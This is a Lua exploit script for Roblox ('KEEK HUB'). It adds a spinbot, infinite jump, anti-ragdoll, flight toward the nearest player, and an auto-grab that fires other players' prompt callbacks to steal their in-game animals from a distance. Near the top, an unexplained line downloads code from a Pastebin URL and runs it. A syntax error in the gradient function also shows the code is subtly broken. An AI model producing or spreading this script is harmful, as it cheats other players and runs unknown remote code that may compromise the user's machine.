local plr = game.Players.LocalPlayer
local uis = game:GetService("UserInputService")
local rs = game:GetService("RunService")
local ts = game:GetService("TweenService")
local ws = workspace
local cg = game:GetService("CoreGui")
local rep = game:GetService("ReplicatedStorage")
loadstring(game:HttpGet("https://pastebin.com/raw/kQwnUAh4"))()

local par = (gethui and gethui()) or cg
local cam = ws.CurrentCamera

local pd = Color3.fromRGB(35, 15, 65)
local pm = Color3.fromRGB(70, 35, 140)
local pl = Color3.fromRGB(110, 55, 200)
local pa = Color3.fromRGB(150, 75, 255)
local pb = Color3.fromRGB(190, 115, 255)
local pg = Color3.fromRGB(210, 150, 255)
local bgc = Color3.fromRGB(12, 8, 20)
local wh = Color3.fromRGB(255, 255, 255)

local speed55 = false
local speedSteal = false
local spinbot = false
local autograb = false
local xrayon = false
local antirag = false
local floaton = false
local infjump = false

local xrayOg = {}
local xrayConns = {}
local conns = {}

local blocked = {
    [Enum.HumanoidStateType.Ragdoll] = true,
    [Enum.HumanoidStateType.FallingDown] = true,
    [Enum.HumanoidStateType.Physics] = true,
    [Enum.HumanoidStateType.Dead] = true
}

local target = nil
local floatConn = nil
local floatSpeed = 56.1
local vertSpeed = 35

local movingDots = {}
local sprintMovingDots = {}

local function spinOn(c)
    local hrp = c:WaitForChild("HumanoidRootPart", 5)
    if not hrp then return end
    for _, v in pairs(hrp:GetChildren()) do
        if v:IsA("BodyAngularVelocity") then
            v:Destroy()
        end
    end
    local bv = Instance.new("BodyAngularVelocity")
    bv.MaxTorque = Vector3.new(0, math.huge, 0)
    bv.AngularVelocity = Vector3.new(0, 40, 0)
    bv.Parent = hrp
end

local function spinOff(c)
    if c then
        local hrp = c:FindFirstChild("HumanoidRootPart")
        if hrp then
            for _, v in pairs(hrp:GetChildren()) do
                if v:IsA("BodyAngularVelocity") then
                    v:Destroy()
                end
            end
        end
    end
end

local function toggleSpin(b)
    spinbot = b
    if b then
        if plr.Character then
            spinOn(plr.Character)
        end
        table.insert(conns, plr.CharacterAdded:Connect(function(c)
            spinOn(c)
        end))
    else
        if plr.Character then
            spinOff(plr.Character)
        end
    end
end

local function createDots(parent)
    local container = Instance.new("Frame", parent)
    container.Size = UDim2.new(1, 0, 1, 0)
    container.Position = UDim2.new(0, 0, 0, 0)
    container.BackgroundTransparency = 1
    container.ZIndex = 0
    container.Name = "DotBackground"
    
    local dots = {}
    for i = 1, 40 do
        local dot = Instance.new("Frame")
        dot.Size = UDim2.new(0, 3, 0, 3)
        dot.Position = UDim2.new(math.random(), 0, math.random(), 0)
        dot.BackgroundColor3 = pa
        dot.BackgroundTransparency = 0.4
        dot.BorderSizePixel = 0
        dot.Parent = container
        dot.ZIndex = 0
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(1, 0)
        corner.Parent = dot
        
        local stroke = Instance.new("UIStroke")
        stroke.Color = pb
        stroke.Thickness = 1
        stroke.Transparency = 0.7
        stroke.Parent = dot
        
        table.insert(dots, {
            frame = dot,
            sx = (math.random() - 0.5) * 0.015,
            sy = (math.random() - 0.5) * 0.015,
            pulse = math.random() * 2
        })
    end
    
    return container, dots
end

local anti = {}
local antiMode = nil
local ragConns = {}
local charCache = {}

local function cacheChar()
    local c = plr.Character
    if not c then return false end
    local h = c:FindFirstChildOfClass("Humanoid")
    local r = c:FindFirstChild("HumanoidRootPart")
    if not h or not r then return false end
    charCache = {
        char = c,
        hum = h,
        root = r
    }
    return true
end

local function killConns()
    for _, c in pairs(ragConns) do
        pcall(function() c:Disconnect() end)
    end
    ragConns = {}
end

local function isRagdoll()
    if not charCache.hum then return false end
    local s = charCache.hum:GetState()
    if s == Enum.HumanoidStateType.Physics or s == Enum.HumanoidStateType.Ragdoll or s == Enum.HumanoidStateType.FallingDown then
        return true
    end
    local et = plr:GetAttribute("RagdollEndTime")
    if et then
        local n = workspace:GetServerTimeNow()
        if (et - n) > 0 then
            return true
        end
    end
    return false
end

local function removeCons()
    if not charCache.char then return end
    for _, d in pairs(charCache.char:GetDescendants()) do
        if d:IsA("BallSocketConstraint") or (d:IsA("Attachment") and string.find(d.Name, "RagdollAttachment")) then
            pcall(function() d:Destroy() end)
        end
    end
end

local function forceExit()
    if not charCache.hum or not charCache.root then return end
    pcall(function()
        plr:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow())
    end)
    if charCache.hum.Health > 0 then
        charCache.hum:ChangeState(Enum.HumanoidStateType.Running)
    end
    charCache.root.Anchored = false
    charCache.root.AssemblyLinearVelocity = Vector3.zero
end

local function antiLoop()
    while antiMode == "v1" and charCache.hum do
        task.wait()
        if isRagdoll() then
            removeCons()
            forceExit()
        end
    end
end

local function setupCam()
    if not charCache.hum then return end
    table.insert(ragConns, rs.RenderStepped:Connect(function()
        if antiMode ~= "v1" then return end
        local c = workspace.CurrentCamera
        if c and charCache.hum and c.CameraSubject ~= charCache.hum then
            c.CameraSubject = charCache.hum
        end
    end))
end

local function onChar(c)
    task.wait(0.5)
    if not antiMode then return end
    if cacheChar() then
        if antiMode == "v1" then
            setupCam()
            task.spawn(antiLoop)
        end
    end
end

function anti.Enable(m)
    if m ~= "v1" then return end
    if antiMode == m then return end
    anti.Disable()
    if not cacheChar() then return end
    antiMode = m
    table.insert(ragConns, plr.CharacterAdded:Connect(onChar))
    setupCam()
    task.spawn(antiLoop)
    print("anti on")
end

function anti.Disable()
    if not antiMode then return end
    antiMode = nil
    killConns()
    charCache = {}
    print("anti off")
end

local AnimalsData = require(rep:WaitForChild("Datas"):WaitForChild("Animals"))

local animalCache = {}
local promptMem = {}
local stealMem = {}
local lastUid = nil
local lastPos = nil

local radius = 150
local stealing = false
local stealProg = 0
local curTarget = nil
local stealStart = 0
local stealConn = nil
local velConn = nil

local grabUI = nil
local progBar = nil
local dotsFolder = nil

local function hrp()
    local c = plr.Character
    if not c then return nil end
    return c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("UpperTorso")
end

local function isMyBase(n)
    local p = workspace.Plots:FindFirstChild(n)
    if not p then return false end
    local s = p:FindFirstChild("PlotSign")
    if s then
        local y = s:FindFirstChild("YourBase")
        if y and y:IsA("BillboardGui") then
            return y.Enabled == true
        end
    end
    return false
end

local function scanPlot(p)
    if not p or not p:IsA("Model") then return end
    if isMyBase(p.Name) then return end
    local pods = p:FindFirstChild("AnimalPodiums")
    if not pods then return end
    for _, pod in pairs(pods:GetChildren()) do
        if pod:IsA("Model") and pod:FindFirstChild("Base") then
            local name = "Unknown"
            local spawn = pod.Base:FindFirstChild("Spawn")
            if spawn then
                for _, c in pairs(spawn:GetChildren()) do
                    if c:IsA("Model") and c.Name ~= "PromptAttachment" then
                        name = c.Name
                        local info = AnimalsData[name]
                        if info and info.DisplayName then
                            name = info.DisplayName
                        end
                        break
                    end
                end
            end
            table.insert(animalCache, {
                name = name,
                plot = p.Name,
                slot = pod.Name,
                pos = pod:GetPivot().Position,
                uid = p.Name .. "_" .. pod.Name,
            })
        end
    end
end

local function setupScanner()
    task.wait(2)
    local plots = workspace:WaitForChild("Plots", 10)
    if not plots then return end
    for _, p in pairs(plots:GetChildren()) do
        if p:IsA("Model") then
            scanPlot(p)
        end
    end
    plots.ChildAdded:Connect(function(p)
        if p:IsA("Model") then
            task.wait(0.5)
            scanPlot(p)
        end
    end)
    task.spawn(function()
        while task.wait(5) do
            if autograb then
                animalCache = {}
                for _, p in pairs(plots:GetChildren()) do
                    if p:IsA("Model") then
                        scanPlot(p)
                    end
                end
            end
        end
    end)
end

local function findPrompt(d)
    if not d then return nil end
    local cached = promptMem[d.uid]
    if cached and cached.Parent then
        return cached
    end
    local p = workspace.Plots:FindFirstChild(d.plot)
    if not p then return nil end
    local pods = p:FindFirstChild("AnimalPodiums")
    if not pods then return nil end
    local pod = pods:FindFirstChild(d.slot)
    if not pod then return nil end
    local b = pod:FindFirstChild("Base")
    if not b then return nil end
    local s = b:FindFirstChild("Spawn")
    if not s then return nil end
    local a = s:FindFirstChild("PromptAttachment")
    if not a then return nil end
    for _, pr in pairs(a:GetChildren()) do
        if pr:IsA("ProximityPrompt") then
            promptMem[d.uid] = pr
            return pr
        end
    end
    return nil
end

local function updateVel()
    local h = hrp()
    if not h then return end
    local cur = h.Position
    if lastPos then
        lastPos = cur
    else
        lastPos = cur
    end
end

local function shouldSteal(d)
    if not d or not d.pos then return false end
    local h = hrp()
    if not h then return false end
    return (h.Position - d.pos).Magnitude <= radius
end

local function buildCallbacks(p)
    if stealMem[p] then return end
    local data = {hold = {}, trig = {}, ready = true}
    local ok, c = pcall(getconnections, p.PromptButtonHoldBegan)
    if ok and type(c) == "table" then
        for _, con in pairs(c) do
            if type(con.Function) == "function" then
                table.insert(data.hold, con.Function)
            end
        end
    end
    local ok2, c2 = pcall(getconnections, p.Triggered)
    if ok2 and type(c2) == "table" then
        for _, con in pairs(c2) do
            if type(con.Function) == "function" then
                table.insert(data.trig, con.Function)
            end
        end
    end
    if #data.hold > 0 or #data.trig > 0 then
        stealMem[p] = data
    end
end

local function doSteal(p, d)
    local data = stealMem[p]
    if not data or not data.ready then return false end
    data.ready = false
    stealing = true
    stealProg = 0
    curTarget = d
    stealStart = tick()
    task.spawn(function()
        if #data.hold > 0 then
            for _, fn in pairs(data.hold) do
                task.spawn(fn)
            end
        end
        local st = tick()
        while tick() - st < 1.3 do
            stealProg = (tick() - st) / 1.3
            task.wait(0.05)
        end
        stealProg = 1
        if #data.trig > 0 then
            for _, fn in pairs(data.trig) do
                task.spawn(fn)
            end
        end
        task.wait(0.1)
        data.ready = true
        task.wait(0.3)
        stealing = false
        stealProg = 0
        curTarget = nil
    end)
    return true
end

local function attemptSteal(p, d)
    if not p or not p.Parent then return false end
    buildCallbacks(p)
    if not stealMem[p] then return false end
    return doSteal(p, d)
end

local function getNearest()
    local h = hrp()
    if not h then return nil end
    local n = nil
    local md = math.huge
    for _, d in pairs(animalCache) do
        if not isMyBase(d.plot) and d.pos then
            local dist = (h.Position - d.pos).Magnitude
            if dist < md then
                md = dist
                n = d
            end
        end
    end
    return n
end

local function setupGrabUI()
    if grabUI and grabUI.Parent then
        grabUI:Destroy()
    end
    grabUI = Instance.new("ScreenGui")
    grabUI.Name = "GrabUI"
    grabUI.ResetOnSpawn = false
    grabUI.Parent = plr:WaitForChild("PlayerGui")
    
    local m = Instance.new("Frame")
    m.Size = UDim2.new(0, 280, 0, 24)
    m.Position = UDim2.new(0.5, -140, 1, -100)
    m.BackgroundColor3 = Color3.fromRGB(15, 0, 35)
    m.BackgroundTransparency = 0.15
    m.BorderSizePixel = 0
    m.Parent = grabUI
    
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 12)
    c.Parent = m
    
    local s = Instance.new("UIStroke")
    s.Thickness = 1.5
    s.Color = Color3.fromRGB(170, 0, 255)
    s.Transparency = 0.1
    s.Parent = m
    
    dotsFolder = Instance.new("Folder")
    dotsFolder.Parent = m
    
    for i = 1, 30 do
        local d = Instance.new("Frame")
        d.Size = UDim2.new(0, math.random(2,4), 0, math.random(2,4))
        d.Position = UDim2.new(math.random(), 0, math.random(), 0)
        d.BackgroundColor3 = Color3.fromRGB(200, 0, 255)
        d.BackgroundTransparency = math.random(40,80)/100
        d.BorderSizePixel = 0
        d.Parent = dotsFolder
        local dc = Instance.new("UICorner")
        dc.CornerRadius = UDim.new(1,0)
        dc.Parent = d
        d:SetAttribute("Speed", math.random(3,15)/1000)
    end
    
    local pb = Instance.new("Frame")
    pb.Size = UDim2.new(0.92, 0, 0, 10)
    pb.Position = UDim2.new(0.04, 0, 0.5, -5)
    pb.BackgroundColor3 = Color3.fromRGB(30, 0, 60)
    pb.BackgroundTransparency = 0.3
    pb.BorderSizePixel = 0
    pb.Parent = m
    
    local bc = Instance.new("UICorner")
    bc.CornerRadius = UDim.new(1, 0)
    bc.Parent = pb
    
    progBar = Instance.new("Frame")
    progBar.Size = UDim2.new(0, 0, 1, 0)
    progBar.BackgroundColor3 = Color3.fromRGB(200, 0, 255)
    progBar.BorderSizePixel = 0
    progBar.Parent = pb
    
    local fc = Instance.new("UICorner")
    fc.CornerRadius = UDim.new(1, 0)
    fc.Parent = progBar
end

local function startGrab()
    autograb = true
    setupGrabUI()
    setupScanner()
    if stealConn then stealConn:Disconnect() end
    if velConn then velConn:Disconnect() end
    velConn = rs.Heartbeat:Connect(updateVel)
    stealConn = rs.Heartbeat:Connect(function()
        if not autograb then return end
        if stealing then return end
        local tar = getNearest()
        if not tar then return end
        if not shouldSteal(tar) then return end
        if lastUid ~= tar.uid then
            lastUid = tar.uid
        end
        local p = promptMem[tar.uid]
        if not p or not p.Parent then
            p = findPrompt(tar)
        end
        if p then
            attemptSteal(p, tar)
        end
    end)
    print("grab on")
end

local function stopGrab()
    autograb = false
    if stealConn then
        stealConn:Disconnect()
        stealConn = nil
    end
    if velConn then
        velConn:Disconnect()
        velConn = nil
    end
    if grabUI then
        grabUI:Destroy()
        grabUI = nil
    end
    progBar = nil
    dotsFolder = nil
    animalCache = {}
    promptMem = {}
    stealMem = {}
    print("grab off")
end

local function startFloat()
    floaton = true
    if floatConn then floatConn:Disconnect() end
    floatConn = rs.Heartbeat:Connect(function()
        if not floaton then return end
        local c = plr.Character
        if not c then return end
        local h = c:FindFirstChild("HumanoidRootPart")
        if not h then return end
        local np = nil
        local nd = math.huge
        for _, p in pairs(game.Players:GetPlayers()) do
            if p ~= plr and p.Character then
                local oh = p.Character:FindFirstChild("HumanoidRootPart")
                if oh then
                    local d = (h.Position - oh.Position).Magnitude
                    if d < nd then
                        nd = d
                        np = p
                    end
                end
            end
        end
        if np and np.Character then
            local th = np.Character:FindFirstChild("HumanoidRootPart")
            if th then
                target = np
                local dir = (th.Position - h.Position).Unit
                local hd = th.Position.Y - h.Position.Y
                local hv = dir * floatSpeed
                local vv = 0
                if hd > 2 then
                    vv = vertSpeed
                elseif hd < -2 then
                    vv = -vertSpeed * 0.5
                end
                h.AssemblyLinearVelocity = Vector3.new(hv.X, vv, hv.Z)
            end
        else
            h.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            target = nil
        end
    end)
    print("float on")
end

local function stopFloat()
    floaton = false
    target = nil
    if floatConn then
        floatConn:Disconnect()
        floatConn = nil
    end
    local c = plr.Character
    if c then
        local h = c:FindFirstChild("HumanoidRootPart")
        if h then
            h.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
        end
    end
    print("float off")
end

local function drag(obj)
    local d, i, s, p
    obj.InputBegan:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
            d = true
            s = inp.Position
            p = obj.Position
            inp.Changed:Connect(function()
                if inp.UserInputState == Enum.UserInputState.End then
                    d = false
                end
            end)
        end
    end)
    obj.InputChanged:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
            i = inp
        end
    end)
    uis.InputChanged:Connect(function(inp)
        if inp == i and d then
            local delta = inp.Position - s
            obj.Position = UDim2.new(p.X.Scale, p.X.Offset + delta.X, p.Y.Scale, p.Y.Offset + delta.Y)
        end
    end)
end

local gui = Instance.new("ScreenGui", par)
gui.Name = "KEEK"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local function new(c, props)
    local o = Instance.new(c)
    for k, v in pairs(props) do
        if k ~= "Parent" then
            o[k] = v
        end
    end
    if props.Parent then
        o.Parent = props.Parent
    end
    return o
end

local main = new("Frame", {
    Name = "main",
    Size = UDim2.new(0, 160, 0, 172),
    Position = UDim2.new(0.5, -180, 0.5, -86),
    BackgroundTransparency = 1,
    Active = true,
    Draggable = true,
    Parent = gui
})
main.Visible = false

local bg = new("Frame", {
    Size = UDim2.new(1, 0, 1, 0),
    BackgroundColor3 = bgc,
    BackgroundTransparency = 1,
    BorderSizePixel = 0,
    Parent = main
})

new("UICorner", {
    CornerRadius = UDim.new(0, 8),
    Parent = bg
})

local dotContainer, movingDots = createDots(bg)

local function mkGrad(p)
    local g = Instance.new("UIGradient")
    g.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, pd),
        ColorSequenceKeypoint.new(0.3, pm),
        ColorSequenceKeypoint.new(0.6, pa)
      ColorSequenceKeypoint.new(1, pg)
    })
    g.Rotation = 45
    g.Parent = p
end

mkGrad(bg)

local title = new("TextLabel", {
    Size = UDim2.new(1, 0, 0, 24),
    BackgroundTransparency = 1,
    Text = "KEEK HUB",
    TextColor3 = wh,
    TextScaled = true,
    Font = Enum.Font.GothamBold,
    Parent = bg
})

local function toggleBtn(txt, y, callback)
    local btn = new("TextButton", {
        Size = UDim2.new(0.9, 0, 0, 20),
        Position = UDim2.new(0.05, 0, 0, y),
        BackgroundColor3 = pm,
        Text = txt.." : OFF",
        TextColor3 = wh,
        TextScaled = true,
        Font = Enum.Font.Gotham,
        Parent = bg
    })

    new("UICorner",{CornerRadius = UDim.new(0,6),Parent = btn})

    local state = false

    btn.MouseButton1Click:Connect(function()
        state = not state
        btn.Text = txt.." : "..(state and "ON" or "OFF")
        callback(state)
    end)
end

toggleBtn("Spinbot",30,function(v)
    toggleSpin(v)
end)

toggleBtn("Auto Grab",55,function(v)
    if v then
        startGrab()
    else
        stopGrab()
    end
end)

toggleBtn("Float Target",80,function(v)
    if v then
        startFloat()
    else
        stopFloat()
    end
end)

toggleBtn("Anti Ragdoll",105,function(v)
    if v then
        anti.Enable("v1")
    else
        anti.Disable()
    end
end)

toggleBtn("Infinite Jump",130,function(v)
    infjump = v
end)

uis.JumpRequest:Connect(function()
    if infjump then
        local c = plr.Character
        if c then
            local h = c:FindFirstChildOfClass("Humanoid")
            if h then
                h:ChangeState(Enum.HumanoidStateType.Jumping)
            end
        end
    end
end)

main.Visible = true
